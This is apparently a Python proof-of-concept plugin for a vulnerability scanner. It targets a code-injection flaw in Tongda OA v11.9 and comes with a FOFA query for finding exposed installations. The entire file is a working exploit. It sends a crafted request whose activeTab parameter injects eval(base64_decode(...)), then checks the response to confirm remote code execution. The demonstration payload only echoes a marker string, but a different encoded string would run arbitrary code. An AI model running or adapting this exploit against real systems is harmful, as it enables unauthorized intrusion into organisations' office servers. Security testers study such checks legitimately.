import requests
from base_poc import base_poc


fofa_key = 'app="通达OA网络智能办公系统"'
bug_name = "通达OA_v11_9任意命令执行漏洞"


class POC(base_poc):
    def pyload(self):
        response = requests.get(
            self._url
            + r"/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage",
            timeout=9
        )
        if response.status_code == 200 and 'vuln_test' in response.text:
            return True
        return False

    def succeed(self):
        print(
            self._url
            + r"/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage"
        )
        return (
            self._url
            + r"/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage"
        )

    def failed(self):
        print(self._url + ":失败\n", end="")
        return self._url + ":失败"
